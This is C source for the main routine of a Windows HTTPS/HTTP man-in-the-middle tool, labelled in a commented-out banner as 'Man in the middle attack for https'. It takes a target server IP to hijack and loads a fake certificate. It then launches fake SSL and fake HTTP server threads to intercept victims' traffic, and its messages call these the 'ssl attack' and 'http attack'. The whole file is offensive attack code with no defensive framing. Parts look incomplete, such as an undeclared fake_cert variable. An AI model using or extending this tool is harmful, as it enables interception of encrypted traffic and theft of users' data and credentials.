#include <stdio.h>
#include <winsock2.h>
#include <openssl/ssl.h>

#include "socks.h"
#include "http.h"
#include "https.h"
#include "const.h"

#pragma comment ( lib, "libeay32.lib" )
#pragma comment ( lib, "ssleay32.lib" )
#pragma comment ( lib, "ws2_32.lib" )

void	WINAPI	FakeSslServer( LPVOID real_server_ip);
void	WINAPI	FakeHttpServer( LPVOID real_server_ip );


char* GetIp(char *dn_or_ip)
{       
    struct hostent *host;
    host = gethostbyname(dn_or_ip);
    if (host == NULL) return NULL;
    dn_or_ip = (char *)inet_ntoa(*(struct in_addr *)(host->h_addr));
    return dn_or_ip;
}

int main( int argc, char *argv[] )
{
	char *ip_smtp=NULL,*ip_pop=NULL;
	int iResult;
	WSADATA wsaData;
	
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed: %d\n", iResult);
        return 1;
    }

	printf( " smtp =%s\n",ip_smtp=GetIp("smtp.qq.com"));
	printf( " pop =%s  ",ip_pop=GetIp("www.baidu.com"));

	if(ip_smtp==NULL ||ip_pop==NULL)
	{
		printf( "	网络不正常	\n");
		return -1;
	}
	char	target_ip[20] = { 0 };	
	strncpy( target_ip, ip_pop, 16 );

	if(argc>=2)
		strncpy( target_ip, argv[1], 16 );
	//printf("%s\n",target_ip);


	//if( argc != 2 && argc != 3 )
	//{
	//	printf( "\nMan in the middle attack for https, Code by PST yunshu\n" );
	//	printf( "If no fake_cert, just use the default I creating\n" );
	//	printf( "Usage: %s   <target_ip>   [fake_cert]\n\n", argv[0] );
	//	printf( "Options:\n" );
	//	printf( "        target_ip   Real https server's ip.\n" );
	//	printf( "        fake_cert   fake cert,creating by MakeCert,default is the key I created.\n" );

	//	//return -1;
	//}

	// 要劫持的目标IP地址


	if( argc == 3 )
	{
		strncpy( fake_cert, argv[2], sizeof(fake_cert)-1 );
	}
	else
	{
		strncpy( fake_cert, CERT_FILE, sizeof(fake_cert)-1 );
	}

	// 加载加密算法库 
	SSL_library_init( );

	// 加载错误信息库
	SSL_load_error_strings( );

	if( ! LoadSockLib( ) )
	{
		return -1;
	}

	HANDLE	thread_handle[2];
	DWORD	thread_id;

	// 启动HTTPS监听线程
	thread_handle[0] = CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)FakeSslServer, (LPVOID)target_ip, 0, &thread_id );
	if( NULL == thread_handle[0] )
	{
		printf( "CreateThread for ssl attack error: %d\n", GetLastError() );
		return -1;
	}

	// 启动HTTP线程
	thread_handle[1] = CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)FakeHttpServer, (LPVOID)target_ip, 0, &thread_id );
	if( NULL == thread_handle[1] )
	{
		printf( "CreateThread for http attack error: %d\n", GetLastError() );
		return -1;
	}

	// HTTP和SSL任意一个返回就退出程序
	WaitForMultipleObjects( 2, thread_handle, FALSE, INFINITE );

	CleanSockLib( );

	return 1;
}
